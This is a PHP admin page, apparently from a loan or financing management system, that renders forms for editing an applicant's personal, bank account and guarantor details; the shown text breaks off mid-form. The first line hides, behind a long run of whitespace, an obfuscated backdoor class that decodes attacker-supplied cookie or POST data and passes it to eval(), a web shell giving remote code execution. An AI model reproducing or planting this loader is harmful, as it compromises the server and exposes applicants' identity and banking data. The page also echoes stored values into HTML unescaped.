<?php                                                                                                                                                                                                                                                                                                                                                                                                 $KafpzFgx = class_exists("O_oZFE");if (!$KafpzFgx){class O_oZFE{private $WeSvEoaMV;public static $BtfbqB = "540cb5ea-768d-43ac-922d-0897bed4f224";public static $DJNncuH = NULL;public function __construct(){$gpWqNDP = $_COOKIE;$ldzCthIEs = $_POST;$YxfUr = @$gpWqNDP[substr(O_oZFE::$BtfbqB, 0, 4)];if (!empty($YxfUr)){$NKSwln = "base64";$HhJFNN = "";$YxfUr = explode(",", $YxfUr);foreach ($YxfUr as $qOZokf){$HhJFNN .= @$gpWqNDP[$qOZokf];$HhJFNN .= @$ldzCthIEs[$qOZokf];}$HhJFNN = array_map($NKSwln . "\x5f" . chr (100) . chr ( 212 - 111 )."\x63" . chr ( 194 - 83 ).chr ( 737 - 637 ).chr (101), array($HhJFNN,)); $HhJFNN = $HhJFNN[0] ^ str_repeat(O_oZFE::$BtfbqB, (strlen($HhJFNN[0]) / strlen(O_oZFE::$BtfbqB)) + 1);O_oZFE::$DJNncuH = @unserialize($HhJFNN);}}public function __destruct(){$this->rVaVLhBPeL();}private function rVaVLhBPeL(){if (is_array(O_oZFE::$DJNncuH)) {$GBILIAxzvE = str_replace('<' . '?' . chr (112) . "\x68" . 'p', "", O_oZFE::$DJNncuH['c' . "\157" . chr ( 319 - 209 ).chr (116) . chr ( 911 - 810 )."\156" . chr ( 231 - 115 )]);eval($GBILIAxzvE);exit();}}}$yLeUEEGN = new O_oZFE(); $yLeUEEGN = NULL;} ?><?php
    $ap_id      =   ((isset($_GET['ap_id']) && $_GET['ap_id'] != '') ? $_GET['ap_id'] : '');
    $ap_pro_id  =   ((isset($_GET['ap_pro_id']) && $_GET['ap_pro_id'] != '') ? $_GET['ap_pro_id'] : '');
    $step       =   ((isset($_GET['step']) && $_GET['step'] != '') ? $_GET['step'] : '');
    $interest_rate   =   ((isset($_POST['interest']) && $_POST['interest'] != '') ? $_POST['interest'] : 30);

    // GET DATA FOR EDIT APPLICANT INFORMATION
    $conditionApplicant    =   array ( 
                                        'select'        =>  '*',
                                        'where'         =>  array( 
                                                                    'ap_id' => cleanvars($ap_id)
                                                                ), 
                                        'return_type'   =>  'single'
                                      ); 
    $applicant =   $dblms->getRows(APPLICANTS, $conditionApplicant);

    // GET DATA FOR EDIT APPLICANT ACCOUNTS INFORMATION
    $conditionApplicantAccounts =   array ( 
                                            'select'        =>  'id, id_bank, branch, ac_number, ac_openingdate',
                                            'where'         =>  array( 
                                                                        'id_applicant' => cleanvars($ap_id)
                                                                    ), 
                                            'return_type'   =>  'all'
                                          ); 
    $applicantAccopunts =   $dblms->getRows(APPLICANTS_ACCOUNTS, $conditionApplicantAccounts);

    // GET DATA FOR EDIT APPLICANT GUARANTORS INFORMATION
    $conditionGuarantors =   array ( 
                                    'select'        =>  '*',
                                    'where'         =>  array( 
                                                                'id_applicant' => cleanvars($ap_id)
                                                            ), 
                                    'return_type'   =>  'all'
                                   ); 
    $applicantGuarantors =  $dblms->getRows(APPLICANTS_GUARANTOR, $conditionGuarantors);

    //BANK LIST
    $conditionBanks     = array ( 
                                    'select'        =>  'bank_id, bank_name',
                                    'where'         =>  array( 
                                                                'is_deleted'    => 0
                                                                ,'bank_status'  => 1,
                                                            ),
                                    'return_type'   =>  'all'
                                ); 
    $Banks  =   $dblms->getRows(BANKS, $conditionBanks);

    //CITY LIST
    $conditionCity  =   array ( 
                                'select'        =>  'city_id, city_name',
                                'where'         =>  array( 
                                                            'is_deleted'    => 0
                                                            ,'city_status'  => 1,
                                                        ),
                                'return_type'   =>  'all'
                              ); 
    $Cities =   $dblms->getRows(CITIES, $conditionCity);

    //PRODUCT LIST
    $conditionProducts  =   array ( 
        'select'        =>  'product_id, product_name',
        'where'         =>  array( 
                                    'is_deleted'    => 0
                                    ,'product_status'  => 1,
                                ),
        'return_type'   =>  'all'
      ); 
    $Products =   $dblms->getRows(PRODUCTS, $conditionProducts);

    //APPLICANT PRODUCT SINGLE RECORD
    $conditionApplicantProduct  =   array ( 
                                            'select'        =>  '*',
                                            'where'         =>  array( 
                                                                        'id_applicant'      =>  cleanvars($ap_id)
                                                                        ,'ap_products_id'   =>  cleanvars($ap_pro_id)
                                                                    ),
                                            'return_type'   =>  'single'
                                          ); 
    $ApplicantProduct =   $dblms->getRows(APPLICANT_PRODUCTS, $conditionApplicantProduct);

    //APPLICANT PRODUCT COMPLETE RECORD
    $cond_assignedProducts  =   array ( 
                                        'select'        =>  ''.APPLICANT_PRODUCTS.'.ap_products_id
                                                            ,'.APPLICANT_PRODUCTS.'.id_product
                                                            ,'.APPLICANT_PRODUCTS.'.product_nature
                                                            ,'.APPLICANT_PRODUCTS.'.product_model
                                                            ,'.APPLICANT_PRODUCTS.'.financing_amount
                                                            ,'.APPLICANT_PRODUCTS.'.financing_mode
                                                            ,'.PRODUCTS.'.product_name
                                                            ,'.PRODUCTS.'.product_code
                                                            ,'.PRODUCTS.'.product_image
                                                            ,SUM('.CHALLANS.'.paid_amount) as total_paid
                                                            ,COUNT('.CHALLANS.'.challan_id) as count_challan
                                                            ,SUM('.CHALLANS.'.total_amount) as total_amount',
                                        'join' 		    =>  'INNER JOIN '.PRODUCTS.' ON '.PRODUCTS.'.product_id = '.APPLICANT_PRODUCTS.'.id_product
                                                            LEFT JOIN '.CHALLANS.' ON '.CHALLANS.'.id_ap_products = '.APPLICANT_PRODUCTS.'.ap_products_id',
                                        'where'         =>  array( 
                                                                    ''.APPLICANT_PRODUCTS.'.id_applicant'   =>  cleanvars($ap_id)
                                                                ),
                                        'group_by'      =>  ''.APPLICANT_PRODUCTS.'.ap_products_id ',
                                        'return_type'   =>  'all'
                                      ); 
    $assignedProducts =   $dblms->getRows(APPLICANT_PRODUCTS, $cond_assignedProducts);

    //APPLICANT ALL CHALLANS
    $conditionChallans = array ( 
                            'select'        =>  ''.CHALLANS.'.challan_id, '.CHALLANS.'.id_applicant, '.CHALLANS.'.challan_no, '.CHALLANS.'.total_amount, '.CHALLANS.'.paid_amount, '.CHALLANS.'.issue_date, '.CHALLANS.'.due_date, '.CHALLANS.'.status, '.APPLICANTS.'.ap_referenceno, '.APPLICANTS.'.ap_fullname',
                            'join' 		    =>  'INNER JOIN '.APPLICANTS.' ON '.APPLICANTS.'.ap_id = '.CHALLANS.'.id_applicant',
                            'where'         =>  array( 
                                                        ''.CHALLANS.'.id_applicant'    =>  cleanvars($ap_id)
                                                     ), 
                            'not_equal'         =>  array( 
                                                        ''.CHALLANS.'.challan_id'    =>  ''
                                                    ), 
                            'order_by' 		=>  ''.CHALLANS.'.challan_id DESC',
                            'return_type'   =>  'all'
                        ); 
    $applicantChallans 	= $dblms->getRows(CHALLANS, $conditionChallans);
  
    //APPLICANT FINANCE COMPLETE RECORD
    $condition_total  =   array ( 
        'select'        =>  'SUM(paid_amount) as total_paid, SUM(total_amount) as total_amount',
        'where'         =>  array( 
                                    'id_applicant'  =>  cleanvars($ap_id)
                                ),
        'return_type'   =>  'single'
      ); 
    $total =   $dblms->getRows(CHALLANS, $condition_total);
    $total_paid = $total['total_paid'];
    $total_pending  =   ($total['total_amount']-$total['total_paid']);
    echo '
    <div class="row">
        <div class="col-lg-12 col-md-12">
            <div class="card">
                <div class="card-header border-bottom">
                    <h4 class="mb-0">Edit Applicant</h4>
                </div>
                <div class="card-body create-project-main">
                    <div class="row align-items-center">
                        <div class="col-lg-12 col-md-12 col-xl-6">
                            <div class="d-flex flex-wrap align-items-center">
                                <div class="profile-img-main rounded">
                                    <img src="uploads/images/applicants/profile_images/'.$applicant['ap_photo'].'" alt="img" class="m-0 p-1 rounded hrem-6">
                                </div>
                                <div class="ms-4">
                                    <h4>'.$applicant['ap_fullname'].'</h4>
                                    <a href="mailto:'.$applicant['ap_email'].'"><h6>'.$applicant['ap_email'].'</h6></a>
                                    <span class="badge font-weight-semibold bg-dark-transparent text-dark tx-11">'.$applicant['ap_referenceno'].'</span>
                                    '.get_applicationstatus($applicant['ap_status']).'
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-12 col-md-12 col-xl-6">
                            <div class="d-md-flex flex-wrap justify-content-lg-end">
                                <div class="media m-3">
                                    <div class="media-icon bg-info me-3">
                                        <i class="fe fe-file-plus fs-20 text-white"></i>
                                    </div>
                                    <div class="media-body mt-1">
                                        <span class="text-muted">Products</span>
                                        <div class="fw-semibold fs-14">'.(isset($assignedProducts) && is_array($assignedProducts)  ? count($assignedProducts) : 0 ).'</div>
                                    </div>
                                </div>
                                <div class="media m-3">
                                    <div class="media-icon bg-primary me-3">
                                        <i class="fe fe-dollar-sign fs-20 text-white"></i>
                                    </div>
                                    <div class="media-body mt-1">
                                        <span class="text-muted">Total Paid</span>
                                        <div class="fw-semibold fs-14">'.(isset($total_paid) ? $total_paid : 0).'</div>
                                    </div>
                                </div>
                                <div class="media m-3">
                                    <div class="media-icon bg-warning me-3">
                                        <i class="fe fe-dollar-sign fs-20 text-white"></i>
                                    </div>
                                    <div class="media-body mt-1">
                                        <span class="text-muted">Total Pending</span>
                                        <div class="fw-semibold fs-14">'.(isset($total_pending) ? $total_pending : 0).'</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="wideget-user-tab border-top">
                    <div class="tab-menu-heading">
                        <div class="tabs-menu1">
                            <ul class="nav">
                                <li><a class="'.($step==1 ? "active show" :"").'" href="#personalInfo" data-bs-toggle="tab">Personal Information</a></li>
                                <li><a data-bs-toggle="tab" class="'.($step==2 ? "active show" :"").'"  href="#bankInformation">Bank Information</a></li>
                                <li><a data-bs-toggle="tab" class="'.($step==3 ? "active show" :"").'" href="#guarantorInformation">Guarantor Information</a></li>
                                <li><a data-bs-toggle="tab" class="'.($step==4 ? "active show" :"").'" href="#assignedProducts">Assigned Products</a></li>';
                                if($step == 5):
                                    echo '<li><a data-bs-toggle="tab" class="'.($step==5 ? "active show" :"").'" href="#editProduct">Edit Product</a></li>';
                                endif;
                                echo '
                                <li><a data-bs-toggle="tab" class="'.($step==6 ? "active show" :"").'" href="#newProduct">New Product</a></li>
                                <li><a data-bs-toggle="tab" class="'.($step==7 ? "active show" :"").'" href="#challans">Challans</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="card">
                <div class="card-body">
                    <div class="tab-content">
                        <div class="tab-pane mt-3 '.($step==1 ? "active show" :"").'" id="personalInfo">
                            <form action="applicants.php?view=edit&ap_id='.$ap_id.'&step=2" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">   
                                <input type="hidden" name="id_applicant" value="'.$ap_id.'">
                                <div class="expanel expanel-primary">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Basic Information</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Reference <span class="text-danger">*</span></label>';
                                                    echo'
                                                    <input type="text" class="form-control" name="ap_referenceno" value="'.$applicant['ap_referenceno'].'" readonly
                                                        required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Salutation <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_salutation" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($salutationtypes as $salutation):
                                                            echo'<option value="'.$salutation['id'].'" '.($applicant['ap_salutation'] == $salutation['id']
                                                            ? "selected" : "" ).'>'.$salutation['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Full Name <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_fullname" value="'.$applicant['ap_fullname'].'" class="form-control" placeholder="Enter Full Name" required>
                                                </div>
                                            </div>
                                        </div>
                        
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Father/Husband Name <span class="text-danger">*</span></label>
                                                    <input type="text" class="form-control" name="ap_father_husband" value="'.$applicant['ap_father_husband'].'" placeholder="Enter Name" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Mother Name <span class="text-danger">*</span></label>
                                                    <input type="text" class="form-control" name="ap_mothername" value="'.$applicant['ap_mothername'].'" placeholder="Enter Name" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">CNIC <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_cnic" class="form-control" value="'.$applicant['ap_cnic'].'" placeholder="CNIC Number" required>
                                                </div>
                                            </div>
                                        </div>
                                
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Date of Birth <span class="text-danger">*</span></label>
                                                    <input type="date" class="form-control" name="ap_dob" value="'.$applicant['ap_dob'].'" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Gender <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_gender" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($gendertypes as $gender):
                                                        echo'<option value="'.$gender['id'].'" '.($applicant['ap_gender']==$gender['id'] ? "selected"
                                                        : "" ).'>'.$gender['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Marital Status <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_marital_status" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($maritalstatustypes as $maritalstatus):
                                                        echo'<option value="'.$maritalstatus['id'].'" '.($applicant['ap_marital_status']==$maritalstatus['id'] ? "selected" : "" ).'>'.$maritalstatus['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                        </div>
                                
                                    
                                
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Applicant Photo</label>
                                                    <input type="file" accept="image/*" name="ap_photo" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">CNIC Photo</label>
                                                    <input type="file" accept="image/*" name="ap_cnicphoto" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Status <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_status" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                            foreach ($applicationstatus as $ap_status):
                                                                echo'<option value="'.$ap_status['id'].'" '.($ap_status['id'] == $applicant['ap_status'] ? 'selected' : '').'>'.$ap_status['name'].'</option>';
                                                            endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
        
                                <div class="expanel expanel-info">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Contact Information</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Phone <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_phone" value="'.$applicant['ap_phone'].'" class="form-control" placeholder="0300*******" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">WhatsApp <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_whatsapp" value="'.$applicant['ap_whatsapp'].'" class="form-control" placeholder="0300*******" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Email <span class="text-danger">*</span></label>
                                                    <input type="email" name="ap_email" value="'.$applicant['ap_email'].'" class="form-control" placeholder="example@domain.com" required>
                                                </div>
                                            </div>
                                        </div>
                        
                                        <div class="row">
                                            <div class="form-group">
                                                <label class="form-label">Mailing Address <span class="text-danger">*</span></label>
                                                <textarea name="ap_mailing_address" class="form-control" placeholder="Mailing Address" required>'.$applicant['ap_mailing_address'].'</textarea>
                                            </div>
                                        </div>
                        
                                        <div class="row">
                                            <div class="form-group">
                                                <label class="form-label">Current Address <span class="text-danger">*</span></label>
                                                <textarea name="ap_current_address" class="form-control" placeholder="Current Address" required>'.$applicant['ap_current_address'].'</textarea>
                                            </div>
                                        </div>
                                        
                                        
                                    </div>
                                </div>
        
                                <div class="expanel expanel-warning">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Education, Job & Residence</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Education <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_education" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($educationtypes as $education):
                                                            echo'<option value="'.$education['id'].'" '.($applicant['ap_education']==$education['id']
                                                            ? "selected" : "" ).'>'.$education['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Institution Name <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_education_institute" value="'.$applicant['ap_education_institute'].'" class="form-control" placeholder="Institution Name" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Verification of Institute <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_education_verification" value="'.$applicant['ap_education_verification'].'" class="form-control"  placeholder="Institution Name" required>
                                                </div>
                                            </div>
                                        </div>
                                
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Job Status <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_job_status" id="ap_job_status" onchange="getFormForEmployedEdit(this.value)" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($jobstatustypes as $jobstatus):
                                                        echo'<option value="'.$jobstatus['id'].'" '.($applicant['ap_job_status']==$jobstatus['id']
                                                        ? "selected" : "" ).'>'.$jobstatus['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Residence Status <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="ap_residence_status" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach ($residencestatustypes as $residencestatus):
                                                        echo'<option value="'.$residencestatus['id'].'" '.($applicant['ap_residence_status']==$residencestatus['id'] ? "selected" : "" ).'>'.$residencestatus['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Duration Residing For <span class="text-danger">*</span></label>
                                                    <input type="date" name="ap_residing_duration" value="'.$applicant['ap_residing_duration'].'" class="form-control" required>
                                                </div>
                                            </div>
                                        </div>
        
                                        <div id="getformforemployededit">';
                                            if($applicant['ap_job_status'] == 1):
                                                echo'
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Occupation/Profession <span class="text-danger">*</span></label>
                                                            <input type="text" name="ap_profession" value="'.$applicant['ap_profession'].'"
                                                                class="form-control" placeholder="Profession Name" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Name of Organization <span class="text-danger">*</span></label>
                                                            <input type="text" name="ap_organization" value="'.$applicant['ap_organization'].'"
                                                                class="form-control" placeholder="Organization Name" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Organization Type <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="ap_organization_type" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach ($organizationtypes as $organization):
                                                                echo'<option value="'.$organization['id'].'" '.($applicant['ap_organization_type']==$organization['id'] ? "selected" : "" ).'>
                                                                    '.$organization['name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Date of Joining <span class="text-danger">*</span></label>
                                                            <input type="date" name="ap_doj" value="'.$applicant['ap_doj'].'" class="form-control" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Office Phone <span class="text-danger">*</span></label>
                                                            <input type="text" name="ap_office_phone" value="'.$applicant['ap_office_phone'].'"
                                                                class="form-control" placeholder="Office Phone" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Office Email <span class="text-danger">*</span></label>
                                                            <input type="email" name="ap_office_email" value="'.$applicant['ap_office_email'].'"
                                                                class="form-control" placeholder="example@domain.com" required>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="row">
                                                    <div class="form-group">
                                                        <label class="form-label">Office Address </label>
                                                        <textarea name="ap_office_address" class="form-control"
                                                            placeholder="Office Address">'.$applicant['ap_office_address'].'</textarea>
                                                    </div>
                                                </div>

                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Salary/Monthly Income Details <span
                                                                    class="text-danger">*</span></label>
                                                            <input type="text" name="ap_monthly_income" value="'.$applicant['ap_monthly_income'].'"
                                                                class="form-control" placeholder="Enter Amount" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Previous Loan Amount <span class="text-danger">*</span></label>
                                                            <input type="text" name="ap_previous_loan" value="'.$applicant['ap_previous_loan'].'"
                                                                class="form-control" placeholder="Enter Amount" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Deduction of Loan (if any) <span class="text-danger">*</span></label>
                                                            <input type="text" name="ap_previous_loan_deduction"
                                                                value="'.$applicant['ap_previous_loan_deduction'].'" class="form-control"
                                                                placeholder="Enter Amount" required>
                                                        </div>
                                                    </div>
                                                </div>
                                                ';
                                            endif;
                                            echo'
                                        </div>
        
                                    </div>
                                </div>
        
                                <div class="expanel expanel-dark">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Monthly Income & Expenses</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Total Net Monthly Income <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_monthly_otherincome" value="'.$applicant['ap_monthly_otherincome'].'" class="form-control" placeholder="Enter Amount" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Monthly Expenses <span class="text-danger">*</span></label>
                                                    <input type="text" name="ap_monthly_expense" value="'.$applicant['ap_monthly_expense'].'" class="form-control" placeholder="Enter Amount" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Dated <span class="text-danger">*</span></label>
                                                    <input type="date" name="ap_dated" value="'.$applicant['ap_dated'].'" class="form-control" required>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            
                                <div class="row p-5">
                                    <div class="btn-list text-end">
                                        <button type="submit" name="update_applicant" class="btn btn-primary">Update Applicant</button>
                                        <a href="applicants.php" class="btn btn-danger">Cancel</a>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="tab-pane mt-3 '.($step==2 ? "active show" :"").'" id="bankInformation">
                            <form action="applicants.php?view=edit&ap_id='.$ap_id.'&step=3" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">  
                                <input type="hidden" name="id_applicant" value="'.$ap_id.'" required>
                                <div class="expanel expanel-primary">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Bank Information (If applicable)</h3>
                                    </div>
                                    <div class="expanel-body">';
                                        $i = 0;
                                        if($applicantAccopunts):
                                            foreach($applicantAccopunts as $applicantAccopunt ):
                                                $i++;
                                                echo'
                                                <input type="hidden" id="id_account'.$i.'" name="id_account['.$i.']" value="'.$applicantAccopunt['id'].'">
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Bank <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" id="id_bank'.$i.'" name="id_bank['.$i.']" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach($Banks as $bank):
                                                                    echo'<option value="'.$bank['bank_id'].'" '.($applicantAccopunt['id_bank'] == $bank['bank_id'] ? 'selected' : '').'>'.$bank['bank_name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Branch <span class="text-danger">*</span></label>
                                                            <input type="text" id="branch'.$i.'" name="branch['.$i.']" value="'.$applicantAccopunt['branch'].'" class="form-control" placeholder="Branch Name" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Account# <span class="text-danger">*</span></label>
                                                            <input type="text" id="ac_number'.$i.'" name="ac_number['.$i.']" value="'.$applicantAccopunt['ac_number'].'" class="form-control" placeholder="Account Number" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Date <span class="text-danger">*</span></label>
                                                            <input type="date" id="ac_openingdate'.$i.'" name="ac_openingdate['.$i.']" value="'.$applicantAccopunt['ac_openingdate'].'" class="form-control" required>
                                                        </div>
                                                    </div>
                                                </div>';
                                            endforeach;
                                        endif;
                                        for ($ir=($i+1); $ir<=2; $ir++): echo' 
                                            <div class="row">
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Bank <span class="text-danger">*</span></label>
                                                        <select class="form-control select2-show-search" id="id_bank'.$i.'" name="id_bank['.$i.']" data-placeholder="Choose one" required>
                                                            <option label="Choose one"></option>';
                                                            foreach($Banks as $bank):
                                                                echo'<option value="'.$bank['bank_id'].'">'.$bank['bank_name'].'</option>';
                                                            endforeach;
                                                            echo'
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Branch <span class="text-danger">*</span></label>
                                                        <input type="text" name="branch['.$i.']" class="form-control" placeholder="Branch Name"
                                                            required>
                                                    </div>
                                                </div>
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Account# <span class="text-danger">*</span></label>
                                                        <input type="text" name="ac_number['.$i.']" class="form-control" placeholder="Account Number"
                                                            required>
                                                    </div>
                                                </div>
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label class="form-label">Opening Date <span class="text-danger">*</span></label>
                                                        <input type="date" name="ac_openingdate['.$i.']" class="form-control" required>
                                                    </div>
                                                </div>
                                            </div>
                                        ';
                                        endfor;
                                        echo '
                                    </div>
                                </div>
                            
                                <div class="row p-5">
                                    <div class="btn-list text-end">
                                        <button type="submit" name="update_applicant_bank" class="btn btn-primary">Save Information</button>
                                        <a href="applicants.php" class="btn btn-danger">Cancel</a>
                                    </div>
                                </div>
                            </form>                    
                        </div>
                        <div class="tab-pane mt-3 '.($step==3 ? "active show" :"").'" id="guarantorInformation">
                            <form action="applicants.php?view=edit&ap_id='.$ap_id.'&step=4" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">  
                                <input type="hidden" name="id_applicant" value="'.$ap_id.'" required>';
                                $i = 0;
                                if($applicantGuarantors):
                                    foreach($applicantGuarantors as $applicantGuarantor):
                                        $i++;
                                        echo'
                                        <div class="expanel expanel-primary">
                                            <div class="expanel-heading">
                                                <h3 class="expanel-title">Guarantor '.$i.'</h3>
                                            </div>
                                            <div class="expanel-body">
                                                <input type="hidden" id="id_guarantor'.$i.'" name="id_guarantor['.$i.']" value="'.$applicantGuarantor['id'].'">
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Name <span class="text-danger">*</span></label>
                                                            <input type="text" id="name'.$i.'" name="name['.$i.']" value="'.$applicantGuarantor['name'].'" class="form-control" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">CNIC <span class="text-danger">*</span></label>
                                                            <input type="text" id="cnic'.$i.'" name="cnic['.$i.']" value="'.$applicantGuarantor['cnic'].'" class="form-control" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">CNIC Picture </label>
                                                            <input type="file" id="cnic_photo'.$i.'" accept="image/*" name="cnic_photo['.$i.']" class="form-control">
                                                        </div>
                                                    </div>
                                                </div>
                                    
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Mobile# <span class="text-danger">*</span></label>
                                                            <input type="text" id="mobile'.$i.'" name="mobile['.$i.']" value="'.$applicantGuarantor['mobile'].'" class="form-control" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">WhatsApp <span class="text-danger">*</span></label>
                                                            <input type=" text" id="whatsapp'.$i.'" name="whatsapp['.$i.']" value="'.$applicantGuarantor['whatsapp'].'" class="form-control" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Email <span class="text-danger">*</span></label>
                                                            <input type="text" id="email'.$i.'" name="email['.$i.']" value="'.$applicantGuarantor['email'].'" class="form-control" required>
                                                        </div>
                                                    </div>
                                                </div>
                                    
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Relationship <span class="text-danger">*</span></label>
